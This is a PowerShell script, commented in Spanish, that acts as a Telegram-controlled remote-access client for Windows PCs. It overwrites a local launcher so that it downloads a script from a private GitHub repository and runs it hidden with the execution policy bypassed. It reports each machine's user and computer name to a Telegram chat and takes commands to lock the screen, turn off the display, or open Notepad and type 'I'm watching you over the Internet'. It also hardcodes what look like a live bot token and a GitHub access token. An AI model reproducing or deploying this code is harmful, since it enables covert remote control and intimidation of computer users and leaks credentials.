# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME
# ==============================================================================
# NO BORRAR #############################################################
# ==============================================================================
# --- NUEVA URL PRIVADA CON LLAVE ACCESO CONSTRUIDA EN EL PASO 1 ---
$NuevaUrlPrivada = "https://joe2sc712-beep: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@github.com/joe2sc712-beep/control-remoto/refs/heads/main/cliente_base.ps1"

# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# Habilitar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==============================================================================
# 🚀 AUTO-ACTUALIZADOR DEL LANZADOR LOCAL (Para no tocar las PCs a mano)
# ==============================================================================
try {
    $RutaLanzadorLocal = "C:\ScriptCliente\cliente.ps1"
    if (Test-Path $RutaLanzadorLocal) {
        $ContenidoActual = Get-Content -Path $RutaLanzadorLocal -Raw
        # Si el lanzador local no tiene la nueva URL privada, la sobrescribe automáticamente
        if ($ContenidoActual -notlike "*$NuevaUrlPrivada*") {
            $NuevoCodigoLanzador = @"
`$UrlGitHub  = "$NuevaUrlPrivada"
`$RutaLocal  = 'C:\ScriptCliente\cliente_base.ps1'
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri `$UrlGitHub -OutFile `$RutaLocal -TimeoutSec 10 -ErrorAction Stop
} catch {}
if (Test-Path `$RutaLocal) {
    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `$RutaLocal
}
"@
            Set-Content -Path $RutaLanzadorLocal -Value $NuevoCodigoLanzador -Force
        }
    }
} catch {}

# ==============================================================================
# LIMPIAR HISTORIAL ANTES DE INICIAR
# ==============================================================================
$LastUpdateID = 0
try {
    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
    if ($PreCheck.result.Count -gt 0) {
        $LastUpdateID = $PreCheck.result[-1].update_id + 1
        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
    }
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = "PC En Linea y Protegida: " + $User + "@" + $MiPC
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
} catch {}

# ==============================================================================
# BUCLE PRINCIPAL DE MONITOREO SEGURO INTERACTIVO
# ==============================================================================
while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                $Partes = $TextoRecibido -split " "
                $Comando = ([string]$Partes[0]).ToLower()
                
                $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                if ($Comando -eq "/lista") {
                    $LetrasPC = [char[]]$MiPC
                    $TotalAscii = 0
                    foreach ($Letra in $LetrasPC) { $TotalAscii += [int]$Letra }
                    $Seed = $TotalAscii % 9
                    if ($Seed -eq 0) { $Seed = 1 }
                    $NumAsignado = [string]$Seed

                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                  "Comandos Globales:`n" +
                                  "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                  "• /ayuda - Ver este menu222222222.`n`n" +
                                  "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
                                  "• /pantalla_off [Numero]`n" +
                                  "• /pantalla_on [Numero]`n" +
                                  "• /notepad [Numero]`n`n" +
                                  "Ejemplo de uso: /notepad 1"
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }

                $MisLetras = [char[]]$MiPC
                $MiAscii = 0
                foreach ($M in $MisLetras) { $MiAscii += [int]$M }
                $MiSeed = $MiAscii % 9
                if ($MiSeed -eq 0) { $MiSeed = 1 }
                $MiIDNum = [string]$MiSeed

                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                    
                    switch ($Comando) {
                        "/pantalla_off" {
                            $rundll = New-Object -ComObject WScript.Shell
                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                        }
                        "/pantalla_on" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("{SHIFT}")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                        }
                        "/notepad" {
                            notepad.exe
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                        }
                    }
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 3
    }
    Start-Sleep -Seconds 2
}



                
